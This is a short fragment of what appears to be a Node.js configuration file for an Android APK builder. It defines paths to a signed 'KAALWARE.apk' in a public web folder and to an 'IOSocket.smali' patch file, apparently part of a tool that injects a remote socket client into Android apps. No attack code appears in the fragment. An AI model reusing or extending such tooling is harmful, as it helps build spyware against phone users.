...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/KAALWARE.apk')
...
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/kaal/ware/IOSocket.smali');
